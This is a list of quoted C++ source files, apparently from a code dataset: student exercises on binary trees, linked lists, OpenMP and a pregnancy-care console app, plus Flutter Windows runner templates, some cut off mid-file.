    "#include<iostream>\n#include<stack>\n#define max 20\nusing namespace std;\nint count=0,count1=0,count2=0;\nclass FT\n{\n\tpublic:\n\tint sal,age,id;\n\tstring name;\n\tFT *lc,*rc;\n         \n\tvoid create();\n\tvoid insert(FT *root,FT *next);\n\tvoid display(FT *root);\n\tvoid leaf(FT *root);\n\tvoid height();\n\tvoid search(FT *root);\t\n}*root,*temp,*next;\n\nvoid FT::create()\n{\n\tint ch;\n\tFT *next;\n\troot=new FT;\n\tcout<<\"ENTER the Emp information\"<<endl;\n\tcout<<\"\\nEnter  the NAME: \";\n\tcin>>root->name;\n\tcout<<\"Enter the id `: \";\n\tcin>>root->id;\n\tcout<<\"Enter AGE: \";\n\tcin>>root->age;\n\tcout<<\" Enter the salary\";\n\tcin>>root->sal;\t\t\t\n\t\n\tcount=count1=count2=1;\n\troot->lc=root->rc=NULL;\n\t\n\tdo{\n\t\tcout<<\"Do you want to add new Node:(0/1)no/yes\";\n\t\tcin>>ch;\n\t\tif(ch==1)\n\t\t{\n\t\t\tnext=new FT;\n\t\t\tcout<<\"Enter the data for new node:\";\n\t\t\t\n\t\t\tcout<<\"ENTER the Emp information\"<<endl;\n\tcout<<\"\\nEnter  the NAME: \";\n\tcin>>next->name;\n\tcout<<\"Enter the id `: \";\n\tcin>>next->id;\n\tcout<<\"Enter AGE: \";\n\tcin>>next->age;\n\tcout<<\" Enter the salary\";\n\tcin>>next->sal;\t\t\t\n\t\t\tnext->lc=next->rc=NULL;\n\t\t\tinsert(root,next);\n\t\t}\n\t\t\n\t}while(ch==1);\n\t\n}\nvoid FT::insert(FT *root,FT *next)\n{\n\t char chr;\n\t FT *temp;\n\t if(root->sal>next->sal)\n\t {\n\t \tif(root->lc==NULL)\n\t \t{\n\t \t\troot->lc=next;\n\t \t\tcount1++;\n\t \t\t\n\t \t}\n\t \telse\n\t \t{\n\t \t\tinsert(root->lc,next);\n\t \t}\n\t \t\n\t }\n\t if(root->sal<next->sal)\n\t {\n\t \tif(root->rc==NULL)\n\t \t{\n\t \t\troot->rc=next;\n\t \t\t\n\t \t}\n\t \telse\n\t \t{\n\t \t\tinsert(root->rc,next);\n\t \t\tcount2++;\n\t \t}\n\t }\n}\t \n\n\n\nvoid FT::display(FT *root)\n{\n    FT *stack[max];\nint top=-1;\nFT*temp;\ntemp=root;\nif(root!=NULL)\n{\ndo\n{\nwhile(temp!=NULL)\n{\ntop++;\nstack[top]=temp;\ntemp=temp->lc;\n}\nif(top!=-1)\n{\ntemp=stack[top];\ncout<<temp->name<<\"\\t\"<<temp->id<<\"\\t\"<<temp->age<<\"\\t\"<<temp->sal<<\"\\t\"<<endl;\ntemp=temp->rc;\n}\ntop--;\n}while(temp!=NULL || top!=-1);\n}\n\n}\nvoid FT::search(FT *root)\n{\n    FT *stack[max];\nstring nn;\ncout<<\"\\nenter the name of the family member \";\ncin>>nn;\n\nint f=0,top=-1;\nFT*temp;\ntemp=root;\nif(root!=NULL)\n{\ndo\n{\nwhile(temp!=NULL)\n{\ntop++;\nstack[top]=temp;\ntemp=temp->lc;\n}\nif(top!=-1)\n{\ntemp=stack[top];\nif(temp->name==nn)\n{\ncout<<\"\\n Record is found\";\nf=1;\ncout<<temp->name<<\"\\t\"<<temp->id<<\"\\t\"<<temp->age<<\"\\t\"<<temp->sal<<\"\\t\"<<endl;\nbreak;\n}temp=temp->rc;\n}\ntop--;\n}while(temp!=NULL || top!=-1);\n\n}\nif(f==0)\ncout<<\"\\n Not found\";\n}\nvoid FT::leaf(FT *root)\n{\n    FT *stack[max];\n    int top=-1;\n    temp=root;\n    if(root!=NULL)\n    {\n        do\n        {\n            while(temp!=NULL)\n            {\n            top++;\n            stack[top]=temp;\n            temp=temp->lc;\n            }\n    if(top!=-1)\n    {\n        temp=stack[top];\n        if(temp->lc==NULL&&temp->rc==NULL)\n        {\n        cout<<\" \"<<temp->name<<endl;\n        }\n        temp=temp->rc;\n        top--;\n        }\n    \n   }while(top!=-1||temp!=NULL);\n  }\n}\n\n\nvoid FT::height()\n{\n    if(count1>=count2)\n    {\n    cout<<\"Height of tree :\"<<count1;\n    }\n    else\n    {\n    cout<<\"Height of tree :\"<<count2;\n    }\n    \n}\n\nint main()\n{\n\tint ch;\n\tFT t;\n\t\n\tdo{\n\t    cout<<\"\\n**MENU\";\n\t\tcout<<\"\\n1.CREATE\";\n\t\tcout<<\"\\n2.DISPLAY\";\n\t\tcout<<\"\\n3.HEIGHT\";\n\t\tcout<<\"\\n4.LEAF NODE\";\n\t\tcout<<\"\\n5.Search\\n6.EXIT\";\n\t\tcout<<\"\\nEnter your Choice:\";\n\t\tcin>>ch;\n\t\t\n\t\tswitch (ch) \n\t\t{\n\t\t\tcase 1:\n\t\t\tt.create();\n\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\tcout<<\"Name\\tId\\tAge\\tSalary\"<<endl;\n\t\t\tt.display(root);\n\t\t\tbreak;\n\t\t\tcase 3:\n\t\t\tt.height();\n\t\t\tbreak;\n\t\t\tcase 4:\n\t\t\tt.leaf(root);\n\t\t\tbreak;\n\t\t\n\t\t\n\t\tcase 5:\n\t\tt.search(root);\n\t\tbreak;\n\t\tcase 6:\n\t\t\texit(0);\n\t\t\tdefault:\n\t\t\tcout<<\"Invalid Choice!!\";\n\t\t\tbreak;\n\t\t}\n\t\t}while(ch!=5);\n\t\treturn 0;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"lesson_27\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\nusing namespace std;\r\n\r\nstruct DietPlan \r\n{\r\n    std::string description;\r\n};\r\n\r\n\r\nstruct ExercisePlan \r\n{\r\n    std::string description;\r\n};\r\n\r\nstruct Doctor \r\n{\r\n    std::string name;\r\n    std::string contactNumber;\r\n};\r\n\r\nstruct Patient \r\n{\r\n    std::string name;\r\n    std::string enrollmentDate;\r\n    std::string contactNumber;\r\n    std::string disease;\r\n    std::string pregnancyWeeks;\r\n    std::string height;\r\n    std::string weight;\r\n    Doctor attendingDoctor;\r\n};\r\nstruct EmergencyContacts\r\n{\r\n\tstd::string name;\r\n\tstd::string contactNumber;\r\n};\r\n\r\nvoid displayDoctors(const std::vector<Doctor>& doctors);\r\nvoid bookAppointment(const Doctor& doctor);\r\nvoid viewPatientInfo(const std::vector<Patient>& patients);\r\nvoid viewPatientInfoIndex(const std::vector<Patient>& patients, int patientChoice);\r\nvoid viewDietPlanForPregnancy();\r\nvoid displayEmergencyContacts(const std::vector<EmergencyContacts>& contacts);\r\n\r\nint main() \r\n{\r\n    std::vector<Doctor> nearbyDoctors;\r\n    nearbyDoctors.push_back({\"Dr. Khurana\", \"789-222-3333\"});\r\n    nearbyDoctors.push_back({\"Dr. Arora\", \"987-333-4444\"});\r\n    nearbyDoctors.push_back({\"Dr. Sharma\", \"986-444-5555\"});\r\n    nearbyDoctors.push_back({\"Dr. Menon\", \"777-444-5555\"});\r\n    nearbyDoctors.push_back({\"Dr. Rudra\", \"897-444-5555\"});\r\n    nearbyDoctors.push_back({\"Dr. Sneha\", \"888-444-5555\"});\r\n\r\n    std::vector<Patient> patients;\r\n    patients.push_back({\"Ishi Dikshit\", \"20-August-2023\", \"123-456-7890\", \"Thyroid\", \"8\", \"5.2\", \"160\", \"55\", {\"Dr. Khurana\", \"789-222-3333\"}});\r\n    patients.push_back({\"Rakshita Rudra\",\"22-April-2023\", \"987-654-3210\",\"N/A\", \"5\", \"165\", \"62\",{\"Dr. Sneha\", \"888-444-5555\"} });\r\n    patients.push_back({\"Anamika Mishra\",\"20-February-2023\", \"555-123-4567\",\"PCOD\",\"9\", \"155\", \"70\",{\"Dr. Sharma\", \"986-444-5555\"}});\r\n    patients.push_back({\"Diya Roy\", \"01-April-2023\", \"789-123-4567\",\"Diabetes\", \"4\", \"162\", \"68\",{\"Dr. Rudra\", \"897-444-5555\"}});\r\n    patients.push_back({\"Priya Sharma\",\"22-july-2023\", \"987-654-3210\",\"N/A\", \"7\", \"163\", \"60\",{\"Dr. Arora\", \"987-333-4444\"}});\r\n    patients.push_back({\"Himanshi Patel\",\"07-june-2023\", \"555-777-8888\",\"Hypertension\", \"2\", \"157\", \"65\",{\"Dr. Khurana\", \"789-222-3333\"} });\r\n    patients.push_back({\"Sneha Gupta\",\"21-August-2023\", \"123-987-6543\",\"Lactose intolrance\", \"5\", \"168\", \"58\",{\"Dr. Menon\", \"777-444-5555\"} });\r\n    patients.push_back({\"Sunena Singh\",\"20-january-2023\", \"777-555-9999\", \"N/A\", \"4\", \"170\", \"70\",{\"Dr. Khurana\", \"789-222-3333\"} });\r\n    patients.push_back({\"Anita Verma\",\"16-March-2023\", \"222-333-4444\", \"Hyperthyroid\", \"8\", \"155\", \"75\",{\"Dr. Arora\", \"987-333-4444\"} });\r\n    patients.push_back({\"Maithili Mehta\",\"16-March-2023\", \"444-555-6666\",\"N/A\", \"7\", \"161\", \"63\",{\"Dr. Rudra\", \"897-444-5555\"} });\r\n    patients.push_back({\"Pooja Malhotra\",\"18-September-2023\", \"555-444-3333\",\"Allergic to Root and tubers\", \"N/A\", \"166\", \"58\", {\"Dr. Menon\", \"777-444-5555\"}});\r\n    patients.push_back({\"Mitali Sharma\",\"29-September-2023\",\"123-987-6543\",\"N/A\", \"3\", \"159\", \"62\", {\"Dr. Rudra\", \"897-444-5555\"}});\r\n\r\n    std::vector<EmergencyContacts> contacts;\r\n    contacts.push_back({\"Apollo Hospitals\",\"1066\"});\r\n    contacts.push_back({\"Fortis Healthcare\",\"105010\"});\r\n    contacts.push_back({\"Emergency Ambulance Services\",\"108\"});\r\n    \r\n    int choice;\r\n    int patientChoice;\r\n\r\n    do {\r\n        std::cout <<endl<< \"1. View patient information\\n\";\r\n        std::cout << \"2. View diet plan for pregnancy\\n\";\r\n        std::cout << \"3. View exercise plan\\n\";\r\n        std::cout << \"4. View nearby doctors\\n\";\r\n        std::cout << \"5. Book an appointment\\n\";\r\n        std::cout << \"6. View emergency contact numbers\\n\";\r\n        std::cout << \"7. Exit\\n\";\r\n        std::cout << \"Enter your choice: \";\r\n        std::cin >> choice;\r\n\r\n        switch (choice) \r\n\t\t{\r\n            case 1:\r\n                viewPatientInfo(patients);\r\n                break;\r\n            case 2:\r\n                viewDietPlanForPregnancy();\r\n                break;\r\n            case 3:\r\n               std::cout <<endl<< \"Your exercise plan for pregnant women: ...\\n\";\r\n               std::cout << \"---------------------------------------------------------------------------\\n\";\r\n               std::cout << \"Day 1: Gentle Cardio and Balance:\\n\";\r\n               std::cout << \"       - Morning: 20 minutes of prenatal walking or stationary cycling at a moderate pace\\n\";\r\n               std::cout << \"       - Afternoon: Balance exercises (standing on one leg, wall-supported squats) for 15 minutes\\n\";\r\n               std::cout << \"       - Evening: Prenatal yoga for relaxation and balance (15-20 minutes)\\n\";\r\n               std::cout << \"---------------------------------------------------------------------------\\n\";\r\n               std::cout << \"Day 2: Rest and Relaxation:\\n\";\r\n               std::cout << \"       - Focus on rest, relaxation, and deep breathing exercises\\n\";\r\n               std::cout << \"-------------",
    "\ufeff#include<iostream>\n#include\"omp.h\"\n#include<thread>\n\nusing namespace std;\n\nconst int rows = 5000;\nconst int cols = 5000;\n\nconst int Treadds = 10;\n\nint MyArr[rows][cols];\n\nvoid init_arr();\n\nint FindMin();\n\nint FindSum();\nint FindSum(int);\n\nint main() {\n\n\tinit_arr();\n\n\tomp_set_nested(1);\n\tdouble t1 = omp_get_wtime();\n#pragma omp parallel sections\n\t{\n#pragma omp section\n\t\t{\n\t\t\tint d = FindSum();\n\t\t\tdouble t2 = omp_get_wtime();\n\n#pragma omp critical\n\t\t\t{\n\t\t\t\tstd::cout << d << endl;\n\t\t\t\tcout << t2 - t1 << endl;\n\t\t\t}\n\t\t}\n\n#pragma omp section\n\t\t{\n\t\t\tint d = FindMin();\n\t\t\tint dd = FindSum(d);\n\t\t\tdouble t2 = omp_get_wtime();\n#pragma omp critical\n\t\t\t{\n\t\t\t\tcout << dd << endl;\n\t\t\t\tcout << d << endl;\n\t\t\t\tcout << t2 - t1 << endl;\n\t\t\t}\n\t\t}\n\t}\n\treturn 2;\n}\n\nint FindSum()\n{\n\tint sum = 0;\n#pragma omp parallel for reduction(+:sum) num_threads(Treadds)\n\tfor (int i = 0; i < rows; i++)\n\t{\n\t\tfor (int j = 0; j < cols; j++)\n\t\t{\n\t\t\tsum = sum + MyArr[i][j];\n\t\t}\n\t\t//std::this_thread::sleep_for(std::chrono::milliseconds(1));\n\t}\n\treturn sum;\n}\n\nint FindSum(int row)\n{\n\tint sum = 0;\n\tfor (int j = 0; j < cols; j++)\n\t{\n\t\tsum = sum + MyArr[row][j];\n\t}\n\n\nreturn sum;\n}\n\nint FindMin()\n{\n\tint IndexOfMin = rows - 1;\n#pragma omp parallel for num_threads(Treadds)\n\tfor (int i = 0; i < rows; i++)\n\t{\n\t\tint t1 = FindSum(i);\n\t\t{\n\t\t\tif (t1 < FindSum(IndexOfMin))\n\t\t\t{\n#pragma omp critical\n\t\t\t\t{\n\t\t\t\t\tif (t1 < FindSum(IndexOfMin))\n\t\t\t\t\t{\n\n\t\t\t\t\t\tIndexOfMin = i;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t//std::this_thread::sleep_for(std::chrono::milliseconds(1));\n\t}\n\treturn IndexOfMin;\n}\n\n\nvoid init_arr() {\n\tfor (int j = 0; j < rows; j++)\n\t{\n\t\tfor (int i = 0; i < cols; i++) {\n\t\t\t//MyArr[j][i] = (i+1)*(j+1);\n\t\t\tMyArr[j][i] = rand()%100;\n\t\t}\n\t}\n}",
    "#include \"my_function.h\"\r\n#include <iostream>\r\n#include <string>\r\n#include <cmath>\r\nusing namespace std;\r\n\r\nvoid list::print_func(int* Age, int count, int num)\r\n{\r\n\tfloat sum = 0, average;\r\n\tint Max, Min;\r\n\tif (num == 1) { // Average\r\n\t\tfor (int i = 0; i < count; i++) {\r\n\t\t\tsum = sum + Age[i];\r\n\t\t}\r\n\t\taverage = sum / count;\r\n\t\taverage = round(average * 10) / 10;\r\n\t\tcout << average << endl;\r\n\t}\r\n\telse if (num == 2) { // Max\r\n\t\tMax = Age[0];\r\n\t\tfor (int i = 1; i < count; i++) {\r\n\t\t\tif (Age[i] > Max) Max = Age[i];\r\n\t\t}\r\n\t\tcout << Max << endl;\r\n\t}\r\n\telse if (num == 3) { // Min\r\n\t\tMin = Age[0];\r\n\t\tfor (int i = 1; i < count; i++) {\r\n\t\t\tif (Age[i] < Min) Min = Age[i];\r\n\t\t}\r\n\t\tcout << Min << endl;\r\n\t}\r\n}\r\n\r\nvoid list::pivot(int num1, int num2) \r\n{\r\n\tint Age[9];\r\n\tint group_cnt = 0;\r\n\tif (num1 == 1) { // Pivot with dept \r\n\t\tfor (int i = 0; i < dept_cnt; i++) {\r\n\t\t\tfor (node* curr = head; curr != NULL; curr = curr->next) {\r\n\t\t\t\tif (dept[i] == curr->data.access_dept()) Age[group_cnt++] = curr->data.access_age(); //add age in Age[] and count\r\n\t\t\t}\r\n\t\t\tcout << dept[i] << \"\\t\";\r\n\t\t\tprint_func(Age, group_cnt, num2);\r\n\t\t\tgroup_cnt = 0; //Reset\r\n\t\t}\r\n\t}\r\n\telse if (num1 == 2) { // Pivot with gender\r\n\t\t// Female\r\n\t\tfor (node* curr = head; curr != NULL; curr = curr->next) {\r\n\t\t\tif (curr->data.access_gender() == \"F\") Age[group_cnt++] = curr->data.access_age();\r\n\t\t}\r\n\t\tcout << \"F\\t\";\r\n\t\tprint_func(Age, group_cnt, num2);\r\n\t\tgroup_cnt = 0; //Reset\r\n\t\t// Male\r\n\t\tfor (node* curr = head; curr != NULL; curr = curr->next) {\r\n\t\t\tif (curr->data.access_gender() == \"M\") Age[group_cnt++] = curr->data.access_age();\r\n\t\t}\r\n\t\tcout << \"M\\t\";\r\n\t\tprint_func(Age, group_cnt, num2);\r\n\t\tgroup_cnt = 0; //Reset\r\n\t}\r\n\telse if (num1 == 3) { // Pivot with dept&gender\r\n\t\tfor (int i = 0; i < dept_cnt; i++) { // Dept\r\n\t\t\t//Female\r\n\t\t\tfor (node* curr = head; curr != NULL; curr = curr->next) {\r\n\t\t\t\tif (dept[i] == curr->data.access_dept() && curr->data.access_gender() == \"F\") Age[group_cnt++] = curr->data.access_age();\r\n\t\t\t}\r\n\t\t\tif (group_cnt != 0) {\r\n\t\t\t\tcout << dept[i] << \"\\t\" << \"F\\t\";\r\n\t\t\t\tprint_func(Age, group_cnt, num2);\r\n\t\t\t}\r\n\t\t\tgroup_cnt = 0; //Reset\r\n\t\t\t//Male\r\n\t\t\tfor (node* curr = head; curr != NULL; curr = curr->next) {\r\n\t\t\t\tif (dept[i] == curr->data.access_dept() && curr->data.access_gender() == \"M\") Age[group_cnt++] = curr->data.access_age();\r\n\t\t\t}\r\n\t\t\tif (group_cnt != 0) {\r\n\t\t\t\tcout << dept[i] << \"\\t\" << \"M\\t\";\r\n\t\t\t\tprint_func(Age, group_cnt, num2);\r\n\t\t\t}\r\n\t\t\tgroup_cnt = 0; //Reset\r\n\t\t}\r\n\t}\r\n}\r\n\r\nint list::update_data()\r\n{\r\n\tif (head == NULL) {\r\n\t\treturn -1;\r\n\t}\r\n\t// Reset dept data\r\n\tfor (int i = 0; i < 9; i++) stu_dept[i] = 0;\r\n\tdept[0] = head->data.access_dept();\r\n\tstu_dept[0] = 1;\r\n\tdept_cnt = 1;\r\n\r\n\t// Update data\r\n\tfor (node* curr = head->next; curr != NULL; curr = curr->next) {\r\n\t\tfor (int i = 0; i <= dept_cnt; i++) {\r\n\t\t\tif (i == dept_cnt) {\r\n\t\t\t\tdept[dept_cnt] = curr->data.access_dept();\r\n\t\t\t\tstu_dept[dept_cnt] ++;\r\n\t\t\t\tdept_cnt++;\r\n\t\t\t}\r\n\t\t\tif (dept[i] == curr->data.access_dept()) {\r\n\t\t\t\tstu_dept[i]++;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\treturn 0; // update successfuly\r\n}\r\n\r\nvoid list::sort() // Bouble sort\r\n{\r\n\tint i, j;\r\n\tnode* curr;\r\n\tif (head == NULL) return; //list\uac00 \ube44\uc5b4\uc788\ub294 \uacbd\uc6b0\r\n\r\n\tfor (i = 1; i < count; i++) {\r\n\t\tcurr = head;\r\n\t\tfor (j = 1; j < i; j++) curr = curr->next;\r\n\t\t// compare\r\n\t\tif (curr->data.datacmp(curr->next->data) > 0) {\r\n\t\t\tstudent temp = curr->data;\r\n\t\t\tcurr->data = curr->next->data;\r\n\t\t\tcurr->next->data = temp;\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid list::delete_node(string fdept, string fgender, string fname, int fage)\r\n{\r\n\tif (head == NULL) { // list\uac00 \ube44\uc5b4\uc788\ub294 \uacbd\uc6b0\r\n\t\tcout << \"Can't delete it\" << endl;\r\n\t\treturn;\r\n\t}\r\n\telse if (head->next == NULL) { // head\ub9cc \uc788\ub294 \uacbd\uc6b0\r\n\t\tif (head->data.findnode(fdept, fgender, fname, fage) == 4) {\r\n\t\t\tdelete head;\r\n\t\t\thead = NULL;\r\n\t\t\tcount--;\r\n\t\t\tcout << \"Deleted!\" << endl;\r\n\t\t\treturn;\r\n\t\t}\r\n\t}\r\n\telse {\r\n\t\tfor (node* curr = head; curr != NULL; curr = curr->next) {\r\n\t\t\tif (curr->next->data.findnode(fdept, fgender, fname, fage) == 4) {//find node to delete\r\n\t\t\t\tif (curr->next->next == NULL) {\r\n\t\t\t\t\tdelete curr->next;\r\n\t\t\t\t\tcurr->next = NULL;\r\n\t\t\t\t\tcount--;\r\n\t\t\t\t\tcout << \"Deleted!\" << endl;\r\n\t\t\t\t\treturn;\r\n\t\t\t\t}\r\n\t\t\t\tnode* temp = curr->next->next;\r\n\t\t\t\tdelete curr->next;\r\n\t\t\t\tcurr->next = temp;\r\n\t\t\t\tcount--;\r\n\t\t\t\tcout << \"Deleted!\" << endl;\r\n\t\t\t\treturn;\r\n\t\t\t}\r\n\t\t}\r\n\t\tcout << \"Can't delete it\" << endl;\r\n\t}\r\n}\r\n\r\nvoid list::save_node(node* fnode)\r\n{\r\n\tif (head == NULL) { //list\uc5d0 node\uac00 \uc5c6\uc744 \ub54c\r\n\t\thead = fnode;\r\n\t}\r\n\telse {\r\n\t\tnode* curr = head;\r\n\t\tfor (int i = count; i > 1; i--) { // Search last node\r\n\t\t\tcurr = curr->next;\r\n\t\t}\r\n\t\tcurr->next = fnode;\r\n\t}\r\n\tcount++;\r\n}\r\n\r\nvoid student::print_info()\r\n{\r\n\tcout << dept << \"\\t\" << gender << \"\\t\" << name << \"\\t\" << age << endl;\r\n}\r\n\r\nint student::datacmp(student data)\r\n{\r\n\tif (dept > (data.dept)) return 1;\r\n\telse if (dept < (data.dept)) return -1;\r\n\telse { // if dept same\r\n\t\tif (gender > (data.gender)) return 1;\r\n\t\telse if (gender < (data.gender)) return -1;\r\n\t\telse { // if gender sa",
